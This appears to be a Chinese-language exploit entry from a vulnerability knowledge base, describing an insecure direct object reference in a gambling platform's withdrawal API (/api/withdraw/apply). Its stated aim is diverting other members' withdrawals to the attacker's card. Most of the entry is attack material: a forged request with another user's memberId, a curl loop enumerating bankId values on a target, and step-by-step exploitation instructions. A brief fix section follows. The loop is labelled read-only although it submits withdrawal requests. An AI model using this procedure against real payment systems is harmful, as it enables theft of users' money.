---
title: 提现银行卡越权替换（把别人提现收进自己卡）
cve: 无（业务逻辑）
severity: critical
cvss: 9.3
product: 自研提现模块（博彩包网）
versions: 任意
ports: 80, 443
keywords: 提现, 银行卡, 越权, 替换, 资金, withdraw
entry: /api/withdraw/apply 的 bankId / cardNo / memberId
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/withdraw/apply  {"amount":100,"bankId":12}
GET  /api/bank/list       → 我的银行卡
```

## 前置条件

- 普通会员；能抓提现申请请求。

## PoC

```http
### 1) 改 bankId 指向他人卡
POST /api/withdraw/apply HTTP/1.1
Authorization: Bearer <token>

{"amount":10,"bankId":<遍历值>,"cardNo":"<自己的卡>","memberId":<他人uid>}
```

```bash
# 2) 遍历回调看是否被采纳（只读判定）
for b in $(seq 1 30); do
  r=$(curl -s -X POST https://target/api/withdraw/apply -H "Authorization: Bearer <t>" \
      -H 'Content-Type: application/json' -d "{\"amount\":1,\"bankId\":$b}")
  echo "$b → $(echo $r | head -c 80)"
done
# 判定：出现"卡号尾号 xxxx"且不是你自己的卡 = 命中
```

## 利用步骤

1. 先绑一张自己的卡做基线；
2. 改 bankId/memberId 提交 1 元提现，看回包里的收款卡尾号；
3. 若显示他人卡 → 资金可被劫持（critical）；
4. 证据：一次请求 + 回包里的卡尾号（打码）。

## 修复与缓解

- 提现只从 token 归属的银行卡表取；bankId 校验属于本人；
- 提现申请与银行卡改绑都要二次验证（短信/2FA）+ 冷静期。

## 参考

- OWASP WSTG-BUSL-01；CWE-639。
